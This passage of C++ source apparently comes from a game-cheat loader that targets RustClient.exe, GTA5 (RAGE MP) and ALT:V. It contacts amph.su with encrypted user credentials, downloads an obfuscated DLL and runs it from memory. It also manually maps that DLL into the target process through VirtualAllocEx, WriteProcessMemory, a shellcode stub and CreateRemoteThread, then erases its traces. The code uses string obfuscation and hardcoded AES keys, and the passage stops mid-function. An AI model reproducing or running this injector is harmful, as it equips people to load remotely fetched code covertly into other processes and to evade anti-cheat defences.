	CURLcode CURLresult = curl_easy_perform(curl);
	curl_easy_cleanup(curl);
	if (CURLresult != CURLE_OK) {
		std::cout << "Error [Cant get cheat DLL]" << std::endl;
		Sleep(9999);
	}
	if (response == aes::encrypt(xorstr_("file_error"), tempory_cipher_key, tempory_iv_key))
		return false;
	for (int i = 0; i < response.size(); i++)
		response[i] = response[i] ^ Crypt::Key[i % (sizeof(Crypt::Key) / sizeof(char))];
	RunExeFromMemory(response.data());
	return true;
}
#include"image.h"
void Inject_alkad()
{

	//vzyal_dlya_sebya(); //WTF???? OMG MAAAN OUUCHH 
	//std::string tempory_cipher_key;
	//std::string tempory_iv_key;
	//std::vector<std::string> vector_tempory_key;
	//char request[512];
	//li(sprintf)(request, xorstr_("https://amph.su/client/session.php"));
	//std::string unprotect_request;
	//CURL* curlq;
	//CURLcode resq;
	//curlq = curl_easy_init();
	//if (curlq) {
	//	curl_easy_setopt(curlq, CURLOPT_URL, request);
	//	curl_easy_setopt(curlq, CURLOPT_WRITEFUNCTION, WriteCallback);
	//	curl_easy_setopt(curlq, CURLOPT_WRITEDATA, &unprotect_request);
	//	resq = curl_easy_perform(curlq);
	//	curl_easy_cleanup(curlq);
	//}
	//unprotect_request = aes::decrypt(unprotect_request, xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q"));
	//for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
	//	tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	//for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
	//	tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	//std::string protect_request = aes::encrypt(unprotect_request.c_str(), tempory_cipher_key, tempory_iv_key);
	//std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
	//std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);
	////std::string protect_pornushka = aes::encrypt(pornushka, tempory_cipher_key, tempory_iv_key);
	//std::string protect_pornushka = aes::encrypt("Alkad cheat", tempory_cipher_key, tempory_iv_key);
	//unprotect_request = aes::encrypt(unprotect_request.c_str(), xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q")); // static keys	
	//li(sprintf)(request, xorstr_("https://amph.su/client/inject.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_pornushka.c_str());
	//std::string response;
	//CURL* curl = curl_easy_init();
	//curl_easy_setopt(curl, CURLOPT_URL, request);
	//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	//curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
	//CURLcode CURLresult = curl_easy_perform(curl);
	//curl_easy_cleanup(curl);
	//if (CURLresult != CURLE_OK) {
	//	std::cout << "Error [Cant get cheat DLL]" << std::endl;
	//	Sleep(9999);
	//}
	//if (response == aes::encrypt(xorstr_("file_error"), tempory_cipher_key, tempory_iv_key))
	//	return NULL;
	//for (int i = 0; i < response.size(); i++)
	//	response[i] = response[i] ^ Crypt::Key[i % (sizeof(Crypt::Key) / sizeof(char))];



	/*DWORD PID = find_process(processvvod);
	HANDLE processHandle = NULL;
	TCHAR filename[MAX_PATH];
	processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID);
	if (processHandle != NULL) {
		if (GetModuleFileNameEx(processHandle, NULL, filename, MAX_PATH) == 0) {
		}
		CloseHandle(processHandle);
	}
	string str2(processvvod);
	li(URLDownloadToFileA)(nullptr, xorstr_("https://amph.su/discord-rpc.dll"), std::string(filename).replace(std::string(filename).find(str2), str2.length(), xorstr_("discord-rpc.dll")).c_str(), 0, nullptr);
	li(URLDownloadToFileA)(nullptr, xorstr_("https://amph.su/bass.dll"), std::string(filename).replace(std::string(filename).find(str2), str2.length(), xorstr_("bass.dll")).c_str(), 0, nullptr);*/








	//std::string tempory_cipher_key;
	//std::string tempory_iv_key;
	//std::vector<std::string> vector_tempory_key;
	//char request[512];
	//li(sprintf)(request, xorstr_("https://amph.su/client/session.php"));
	//std::string unprotect_request;
	//CURL* curlq;
	//CURLcode resq;
	//curlq = curl_easy_init();
	//if (curlq) {
	//	curl_easy_setopt(curlq, CURLOPT_URL, request);
	//	curl_easy_setopt(curlq, CURLOPT_WRITEFUNCTION, WriteCallback);
	//	curl_easy_setopt(curlq, CURLOPT_WRITEDATA, &unprotect_request);
	//	resq = curl_easy_perform(curlq);
	//	curl_easy_cleanup(curlq);
	//}
	//unprotect_request = aes::decrypt(unprotect_request, xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q"));
	//for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
	//	tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	//for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
	//	tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	//std::string protect_request = aes::encrypt(unprotect_request.c_str(), tempory_cipher_key, tempory_iv_key);
	//std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
	//std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);
	//std::string protect_pornushka = aes::encrypt("murmurmurmur", tempory_cipher_key, tempory_iv_key);
	//unprotect_request = aes::encrypt(unprotect_request.c_str(), xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q")); // static keys	
	//li(sprintf)(request, xorstr_("https://amph.su/client/ALKAD_injector.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_pornushka.c_str());
	//std::string response;
	//CURL* curl = curl_easy_init();
	//curl_easy_setopt(curl, CURLOPT_URL, request);
	//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	//curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
	//CURLcode CURLresult = curl_easy_perform(curl);
	//curl_easy_cleanup(curl);
	//if (CURLresult != CURLE_OK) {
	//	std::cout << "Error [Cant get cheat DLL]" << std::endl;
	//	Sleep(9999);
	//}
	//if (response == aes::encrypt(xorstr_("file_error"), tempory_cipher_key, tempory_iv_key))
	//	return false;
	//for (int i = 0; i < response.size(); i++)
	//	response[i] = response[i] ^ Crypt::Key[i % (sizeof(Crypt::Key) / sizeof(char))];
	
	//RunExeFromMemory(Injectoralkad);


	
	Inject* inject = new Inject();
	if (!inject->inject_module_from_path_to_process_by_name((L"RustClient.exe"), 1)) {
		std::cout << "Error bool" << std::endl;
		system("pause");
	}


//	return true;
}


void Inject_RAGE_MP()
{
	//std::string tempory_cipher_key;
	//std::string tempory_iv_key;
	//std::vector<std::string> vector_tempory_key;
	//char request[512];
	//li(sprintf)(request, xorstr_("https://amph.su/client/session.php"));
	//std::string unprotect_request;
	//CURL* curlq;
	//CURLcode resq;
	//curlq = curl_easy_init();
	//if (curlq) {
	//	curl_easy_setopt(curlq, CURLOPT_URL, request);
	//	curl_easy_setopt(curlq, CURLOPT_WRITEFUNCTION, WriteCallback);
	//	curl_easy_setopt(curlq, CURLOPT_WRITEDATA, &unprotect_request);
	//	resq = curl_easy_perform(curlq);
	//	curl_easy_cleanup(curlq);
	//}
	//unprotect_request = aes::decrypt(unprotect_request, xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q"));
	//for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
	//	tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	//for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
	//	tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	//std::string protect_request = aes::encrypt(unprotect_request.c_str(), tempory_cipher_key, tempory_iv_key);
	//std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
	//std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);
	//std::string protect_pornushka = aes::encrypt("INJECTOR", tempory_cipher_key, tempory_iv_key);
	//unprotect_request = aes::encrypt(unprotect_request.c_str(), xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q")); // static keys	
	//li(sprintf)(request, xorstr_("https://amph.su/client/ragemp_injector.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_pornushka.c_str());
	//std::string response;
	//CURL* curl = curl_easy_init();
	//curl_easy_setopt(curl, CURLOPT_URL, request);
	//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	//curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
	//CURLcode CURLresult = curl_easy_perform(curl);
	//curl_easy_cleanup(curl);
	//if (CURLresult != CURLE_OK) {
	//	std::cout << "Error [Cant get cheat DLL]" << std::endl;
	//	Sleep(9999);
	//}
	//if (response == aes::encrypt(xorstr_("file_error"), tempory_cipher_key, tempory_iv_key))
	//	return false;
	//for (int i = 0; i < response.size(); i++)
	//	response[i] = response[i] ^ Crypt::Key[i % (sizeof(Crypt::Key) / sizeof(char))];
	//RunExeFromMemory(response.data());

	Inject* inject = new Inject();
	if (!inject->inject_module_from_path_to_process_by_name((L"GTA5.exe"), 2)) {
		std::cout << "Error bool" << std::endl;
		system("pause");
	}

	//return true;
}




DWORD __stdcall LibraryLoader(LPVOID Memory)
{

	loaderdata* LoaderParams = (loaderdata*)Memory;

	PIMAGE_BASE_RELOCATION pIBR = LoaderParams->BaseReloc;

	DWORD delta = (DWORD)((LPBYTE)LoaderParams->ImageBase - LoaderParams->NtHeaders->OptionalHeader.ImageBase);

	while (pIBR->VirtualAddress)
	{
		if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
		{
			int count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			PWORD list = (PWORD)(pIBR + 1);

			for (int i = 0; i < count; i++)
			{
				if (list[i])
				{
					PDWORD ptr = (PDWORD)((LPBYTE)LoaderParams->ImageBase + (pIBR->VirtualAddress + (list[i] & 0xFFF)));
					*ptr += delta;
				}
			}
		}

		pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
	}

	PIMAGE_IMPORT_DESCRIPTOR pIID = LoaderParams->ImportDirectory;

	// Resolve DLL imports
	while (pIID->Characteristics)
	{
		PIMAGE_THUNK_DATA OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)LoaderParams->ImageBase + pIID->OriginalFirstThunk);
		PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)LoaderParams->ImageBase + pIID->FirstThunk);

		HMODULE hModule = LoaderParams->fnLoadLibraryA((LPCSTR)LoaderParams->ImageBase + pIID->Name);

		if (!hModule)
			return FALSE;

		while (OrigFirstThunk->u1.AddressOfData)
		{
			if (OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// Import by ordinal
				DWORD Function = (DWORD)LoaderParams->fnGetProcAddress(hModule,
					(LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

				if (!Function)
					return FALSE;

				FirstThunk->u1.Function = Function;
			}
			else
			{
				// Import by name
				PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)LoaderParams->ImageBase + OrigFirstThunk->u1.AddressOfData);
				DWORD Function = (DWORD)LoaderParams->fnGetProcAddress(hModule, (LPCSTR)pIBN->Name);
				if (!Function)
					return FALSE;

				FirstThunk->u1.Function = Function;
			}
			OrigFirstThunk++;
			FirstThunk++;
		}
		pIID++;
	}

	if (LoaderParams->NtHeaders->OptionalHeader.AddressOfEntryPoint)
	{
		dllmain EntryPoint = (dllmain)((LPBYTE)LoaderParams->ImageBase + LoaderParams->NtHeaders->OptionalHeader.AddressOfEntryPoint);

		return EntryPoint((HMODULE)LoaderParams->ImageBase, DLL_PROCESS_ATTACH, NULL); // Call the entry point
	}
	return TRUE;
}




#define RELOC_FLAG32(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_HIGHLOW)
#define RELOC_FLAG64(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_DIR64)
#define RELOC_FLAG RELOC_FLAG64

#pragma runtime_checks( "", off )
#pragma optimize( "", off )
void __stdcall Shellcode(MANUAL_MAPPING_DATA* pData) {

	if (!pData) {
		pData->hMod = (HINSTANCE)0x404040;
		return;
	}

	BYTE* pBase = pData->pbase;
	auto* pOpt = &reinterpret_cast<IMAGE_NT_HEADERS*>(pBase + reinterpret_cast<IMAGE_DOS_HEADER*>((uintptr_t)pBase)->e_lfanew)->OptionalHeader;

	auto _LoadLibraryA = pData->pLoadLibraryA;
	auto _GetProcAddress = pData->pGetProcAddress;
	auto _RtlAddFunctionTable = pData->pRtlAddFunctionTable;
	auto _DllMain = reinterpret_cast<f_DLL_ENTRY_POINT>(pBase + pOpt->AddressOfEntryPoint);

	BYTE* LocationDelta = pBase - pOpt->ImageBase;
	if (LocationDelta) {
		if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
			auto* pRelocData = reinterpret_cast<IMAGE_BASE_RELOCATION*>(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
			const auto* pRelocEnd = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<uintptr_t>(pRelocData) + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
			while (pRelocData < pRelocEnd && pRelocData->SizeOfBlock) {
				UINT AmountOfEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				WORD* pRelativeInfo = reinterpret_cast<WORD*>(pRelocData + 1);

				for (UINT i = 0; i != AmountOfEntries; ++i, ++pRelativeInfo) {
					if (RELOC_FLAG(*pRelativeInfo)) {
						UINT_PTR* pPatch = reinterpret_cast<UINT_PTR*>(pBase + pRelocData->VirtualAddress + ((*pRelativeInfo) & 0xFFF));
						*pPatch += reinterpret_cast<UINT_PTR>(LocationDelta);
					}
				}
				pRelocData = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<BYTE*>(pRelocData) + pRelocData->SizeOfBlock);
			}
		}
	}

	if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
		auto* pImportDescr = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		while (pImportDescr->Name) {
			char* szMod = reinterpret_cast<char*>(pBase + pImportDescr->Name);
			HINSTANCE hDll = _LoadLibraryA(szMod);

			ULONG_PTR* pThunkRef = reinterpret_cast<ULONG_PTR*>(pBase + pImportDescr->OriginalFirstThunk);
			ULONG_PTR* pFuncRef = reinterpret_cast<ULONG_PTR*>(pBase + pImportDescr->FirstThunk);

			if (!pThunkRef)
				pThunkRef = pFuncRef;

			for (; *pThunkRef; ++pThunkRef, ++pFuncRef) {
				if (IMAGE_SNAP_BY_ORDINAL(*pThunkRef)) {
					*pFuncRef = (ULONG_PTR)_GetProcAddress(hDll, reinterpret_cast<char*>(*pThunkRef & 0xFFFF));
				}
				else {
					auto* pImport = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(pBase + (*pThunkRef));
					*pFuncRef = (ULONG_PTR)_GetProcAddress(hDll, pImport->Name);
				}
			}
			++pImportDescr;
		}
	}

	if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
		auto* pTLS = reinterpret_cast<IMAGE_TLS_DIRECTORY*>(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
		auto* pCallback = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(pTLS->AddressOfCallBacks);
		for (; pCallback && *pCallback; ++pCallback)
			(*pCallback)(pBase, DLL_PROCESS_ATTACH, nullptr);
	}

	bool ExceptionSupportFailed = false;

	if (pData->SEHSupport) {
		auto excep = pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
		if (excep.Size) {
			if (!_RtlAddFunctionTable(
				reinterpret_cast<IMAGE_RUNTIME_FUNCTION_ENTRY*>(pBase + excep.VirtualAddress),
				excep.Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY), (DWORD64)pBase)) {
				ExceptionSupportFailed = true;
			}
		}
	}

	_DllMain(pBase, pData->fdwReasonParam, pData->reservedParam);

	if (ExceptionSupportFailed)
		pData->hMod = reinterpret_cast<HINSTANCE>(0x505050);
	else
		pData->hMod = reinterpret_cast<HINSTANCE>(pBase);


}
bool ManualMap(HANDLE hProc) {

	struct MemoryStruct chunk {};
	chunk.memory = (char*)malloc(1);
	chunk.size = 0;

	//CURL* curl = curl_easy_init();
	//curl_easy_setopt(curl, CURLOPT_URL, DllURL);
	//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
	//curl_easy_setopt(curl, CURLOPT_NOPROGRESS, FALSE);
	//curl_easy_setopt(curl, CURLOPT_PROGRESSFUNCTION, ProgressBar);
	//curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&chunk);
	//CURLcode CURLresult = curl_easy_perform(curl);
	//curl_easy_cleanup(curl);
	//if (CURLresult != CURLE_OK) {
	//	printf("[-] CURLresult: %d\n", CURLresult);
	//	return false;
	//}


	std::string tempory_cipher_key;
	std::string tempory_iv_key;
	std::vector<std::string> vector_tempory_key;
	char request[512];
	li(sprintf)(request, xorstr_("https://amph.su/client/session.php"));
	std::string unprotect_request;
	CURL* curlq;
	CURLcode resq;
	curlq = curl_easy_init();
	if (curlq) {
		curl_easy_setopt(curlq, CURLOPT_URL, request);
		curl_easy_setopt(curlq, CURLOPT_WRITEFUNCTION, WriteCallback); //WriteCallback
		curl_easy_setopt(curlq, CURLOPT_WRITEDATA, &unprotect_request);
		resq = curl_easy_perform(curlq);
		curl_easy_cleanup(curlq);
	}
	unprotect_request = aes::decrypt(unprotect_request, xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q"));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
		tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
		tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	std::string protect_request = aes::encrypt(unprotect_request.c_str(), tempory_cipher_key, tempory_iv_key);
	std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
	std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);
	//std::string protect_pornushka = aes::encrypt(pornushka, tempory_cipher_key, tempory_iv_key);
	std::string protect_pornushka = aes::encrypt("ALT:V Inject", tempory_cipher_key, tempory_iv_key);
	unprotect_request = aes::encrypt(unprotect_request.c_str(), xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q")); // static keys	
	li(sprintf)(request, xorstr_("https://amph.su/client/ALTV_INJECT.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_pornushka.c_str());
	std::string response;
	CURL* curl = curl_easy_init();
	curl_easy_setopt(curl, CURLOPT_URL, request);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&chunk);
	CURLcode CURLresult = curl_easy_perform(curl);
	curl_easy_cleanup(curl);
	if (CURLresult != CURLE_OK) {
		std::cout << "Error [Cant get cheat DLL]" << std::endl;
		Sleep(9999);
	}
	if (chunk.memory == aes::encrypt(xorstr_("file_error"), tempory_cipher_key, tempory_iv_key))
		return false;
	for (int i = 0; i < chunk.size; i++)
		chunk.memory[i] = chunk.memory[i] ^ Crypt::Key[i % (sizeof(Crypt::Key) / sizeof(char))];













	printf("\nInjecting...\n");

	BYTE* pSrcData = reinterpret_cast<BYTE*>(chunk.memory);
	IMAGE_NT_HEADERS* pOldNtHeader = nullptr;
	IMAGE_OPTIONAL_HEADER* pOldOptHeader = nullptr;
	IMAGE_FILE_HEADER* pOldFileHeader = nullptr;
	BYTE* pTargetBase = nullptr;

	if (reinterpret_cast<IMAGE_DOS_HEADER*>(pSrcData)->e_magic != 0x5A4D) {
		printf("[-] e_magic != 0x5A4D\n");
		return false;
	}

	pOldNtHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(pSrcData + reinterpret_cast<IMAGE_DOS_HEADER*>(pSrcData)->e_lfanew);
	pOldOptHeader = &pOldNtHeader->OptionalHeader;
	pOldFileHeader = &pOldNtHeader->FileHeader;

	pTargetBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hProc, nullptr, pOldOptHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	if (!pTargetBase) {
		printf("[-] VirtualAllocEx [1] Error: 0x%X\n", GetLastError());
		return false;
	}

	DWORD oldp = 0;
	VirtualProtectEx(hProc, pTargetBase, pOldOptHeader->SizeOfImage, PAGE_EXECUTE_READWRITE, &oldp);

	MANUAL_MAPPING_DATA data{ 0 };
	data.pLoadLibraryA = LoadLibraryA;
	data.pGetProcAddress = GetProcAddress;
	data.pRtlAddFunctionTable = (f_RtlAddFunctionTable)RtlAddFunctionTable;
	data.pbase = pTargetBase;
	data.fdwReasonParam = DLL_PROCESS_ATTACH;
	data.reservedParam = 0;
	data.SEHSupport = true;

	if (!WriteProcessMemory(hProc, pTargetBase, pSrcData, 0x1000, nullptr)) {
		VirtualFreeEx(hProc, pTargetBase, 0, MEM_RELEASE);
		printf("[-] WriteProcessMemory [1] Error: 0x%X\n", GetLastError());
		return false;
	}

	IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(pOldNtHeader);
	for (UINT i = 0; i != pOldFileHeader->NumberOfSections; ++i, ++pSectionHeader) {
		if (pSectionHeader->SizeOfRawData) {
			if (!WriteProcessMemory(hProc, pTargetBase + pSectionHeader->VirtualAddress, pSrcData + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData, nullptr)) {
				VirtualFreeEx(hProc, pTargetBase, 0, MEM_RELEASE);
				printf("[-] WriteProcessMemory [2] Error: 0x%X\n", GetLastError());
				return false;
			}
		}
	}

	BYTE* MappingDataAlloc = reinterpret_cast<BYTE*>(VirtualAllocEx(hProc, nullptr, sizeof(MANUAL_MAPPING_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	if (!MappingDataAlloc) {
		VirtualFreeEx(hProc, pTargetBase, 0, MEM_RELEASE);
		printf("[-] VirtualAllocEx [2] Error: 0x%X\n", GetLastError());
		return false;
	}

	if (!WriteProcessMemory(hProc, MappingDataAlloc, &data, sizeof(MANUAL_MAPPING_DATA), nullptr)) {
		VirtualFreeEx(hProc, pTargetBase, 0, MEM_RELEASE);
		VirtualFreeEx(hProc, MappingDataAlloc, 0, MEM_RELEASE);
		printf("[-] WriteProcessMemory [3] Error: 0x%X\n", GetLastError());
		return false;
	}

	void* pShellcode = VirtualAllocEx(hProc, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pShellcode) {
		VirtualFreeEx(hProc, pTargetBase, 0, MEM_RELEASE);
		VirtualFreeEx(hProc, MappingDataAlloc, 0, MEM_RELEASE);
		printf("[-] VirtualAllocEx [3] Error: 0x%X\n", GetLastError());
		return false;
	}

	if (!WriteProcessMemory(hProc, pShellcode, Shellcode, 0x1000, nullptr)) {
		VirtualFreeEx(hProc, pTargetBase, 0, MEM_RELEASE);
		VirtualFreeEx(hProc, MappingDataAlloc, 0, MEM_RELEASE);
		VirtualFreeEx(hProc, pShellcode, 0, MEM_RELEASE);
		printf("[-] WriteProcessMemory [4] Error: 0x%X\n", GetLastError());
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pShellcode), MappingDataAlloc, 0, nullptr);
	if (!hThread) {
		VirtualFreeEx(hProc, pTargetBase, 0, MEM_RELEASE);
		VirtualFreeEx(hProc, MappingDataAlloc, 0, MEM_RELEASE);
		VirtualFreeEx(hProc, pShellcode, 0, MEM_RELEASE);
		printf("[-] CreateRemoteThread Error: 0x%X\n", GetLastError());
		return false;
	}
	CloseHandle(hThread);

	HINSTANCE hCheck = NULL;
	while (!hCheck) {
		DWORD exitcode = 0;
		GetExitCodeProcess(hProc, &exitcode);
		if (exitcode != STILL_ACTIVE) {
			printf("[-] GetExitCodeProcess != STILL_ACTIVE\n");
			return false;
		}

		MANUAL_MAPPING_DATA data_checked{ 0 };
		ReadProcessMemory(hProc, MappingDataAlloc, &data_checked, sizeof(data_checked), nullptr);
		hCheck = data_checked.hMod;

		if (hCheck == (HINSTANCE)0x404040) {
			VirtualFreeEx(hProc, pTargetBase, 0, MEM_RELEASE);
			VirtualFreeEx(hProc, MappingDataAlloc, 0, MEM_RELEASE);
			VirtualFreeEx(hProc, pShellcode, 0, MEM_RELEASE);
			printf("[-] hCheck == 0x404040\n");
			return false;
		}

		Sleep(10);
	}

	BYTE* emptyBuffer = (BYTE*)malloc(1024 * 1024);
	if (emptyBuffer == nullptr) {
		printf("[-] emptyBuffer == nullptr\n");
		return false;
	}

	memset(emptyBuffer, 0, 1024 * 1024);
	WriteProcessMemory(hProc, pTargetBase, emptyBuffer, 0x1000, nullptr);

	pSectionHeader = IMAGE_FIRST_SECTION(pOldNtHeader);
	for (UINT i = 0; i != pOldFileHeader->NumberOfSections; ++i, ++pSectionHeader) {
		if (pSectionHeader->Misc.VirtualSize) {
			DWORD old = 0;
			DWORD newP = PAGE_READONLY;

			if ((pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) > 0)
				newP = PAGE_READWRITE;
			else if ((pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) > 0)
				newP = PAGE_EXECUTE_READ;
			VirtualProtectEx(hProc, pTargetBase + pSectionHeader->VirtualAddress, pSectionHeader->Misc.VirtualSize, newP, &old);
		}
	}

	DWORD old = 0;
	VirtualProtectEx(hProc, pTargetBase, IMAGE_FIRST_SECTION(pOldNtHeader)->VirtualAddress, PAGE_READONLY, &old);

	WriteProcessMemory(hProc, pShellcode, emptyBuffer, 0x1000, nullptr);
	VirtualFreeEx(hProc, pShellcode, 0, MEM_RELEASE);
	VirtualFreeEx(hProc, MappingDataAlloc, 0, MEM_RELEASE);

	free(chunk.memory);

	return true;
}
bool CreateFileFromMemory(const std::string& desired_file_path, const char* address, size_t size)
{
	ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file_ofstream.write(address, size))
	{
		file_ofstream.close();
		return false;
	}

	file_ofstream.close();
	return true;
}

void Inject_ALT_V()
{
	std::string tempory_cipher_key;
	std::string tempory_iv_key;
	std::vector<std::string> vector_tempory_key;
	char request[512];
	LI_FN(sprintf)(request, xor_a("https://amph.su/client/session.php"));
	std::string unprotect_request;
	CURL* curlq;
	CURLcode resq;
	curlq = curl_easy_init();
	if (curlq) {
		curl_easy_setopt(curlq, CURLOPT_URL, request);
		curl_easy_setopt(curlq, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curlq, CURLOPT_WRITEDATA, &unprotect_request);
		resq = curl_easy_perform(curlq);
		curl_easy_cleanup(curlq);
	}
	//unprotect_request = DownloadString(request);
	unprotect_request = aes::decrypt(unprotect_request, xor_a("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xor_a("H1ggF9foFGLerr8q"));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
		tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
		tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	std::string protect_request = aes::encrypt(unprotect_request.c_str(), tempory_cipher_key, tempory_iv_key);
	std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
	std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);

	unprotect_request = aes::encrypt(unprotect_request.c_str(), xor_a("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xor_a("H1ggF9foFGLerr8q")); // static keys	

